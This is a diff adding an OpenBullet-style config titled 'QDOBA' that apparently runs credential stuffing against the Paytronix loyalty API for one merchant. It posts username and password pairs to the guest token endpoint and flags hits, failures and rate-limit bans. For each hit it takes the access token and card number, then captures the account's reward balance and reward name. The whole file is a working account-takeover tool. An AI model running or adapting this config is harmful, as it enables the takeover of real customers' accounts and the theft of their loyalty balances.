@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "QDOBA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-25T01:48:19.3463459-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.pxsweb.com/rest/14.15/oauth/requestGuestToken.json" 
+  CONTENT "{\"authentication\":\"anonymous\",\"grant_type\":\"http:\\/\\/paytronix.com\\/oauth\\/fieldset\",\"client_id\":\"Fzg2PJKpjmPtfzwPbx_W6amvkVeEeQjkMits8oAT\",\"merchantId\":\"632\",\"scope\":\"user_read user_write account_read account_write\",\"cardTemplateCode\":\"0\",\"fields\":{\"username\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "text/plain; charset=UTF-8" 
+  HEADER "User-Agent: PaytronixAPI-Android 20.11" 
+  HEADER "Content-Length: 311" 
+  HEADER "Host: api.pxsweb.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "{ \"result\": \"failure\", \"errorCode\": \"rate_limited\", \"errorMessage\": \"You have exceeded the maximum number of requests for this resource. Please try again later.\" } " 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"," -> VAR "AT" 
+
+PARSE "<SOURCE>" LR "printedCardNumber\":\"" "\"," -> VAR "PCN" 
+
+REQUEST GET "https://api.pxsweb.com/rest/14.15/guest/accountInformation.json?merchantId=632&client_id=Fzg2PJKpjmPtfzwPbx_W6amvkVeEeQjkMits8oAT&access_token=<AT>&authentication=oauth&printedCardNumber=<PCN>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "balance" CreateEmpty=FALSE -> CAP "Balance" 
+
+PARSE "<SOURCE>" JSON "longName" CreateEmpty=FALSE -> CAP "Rewards" 
+
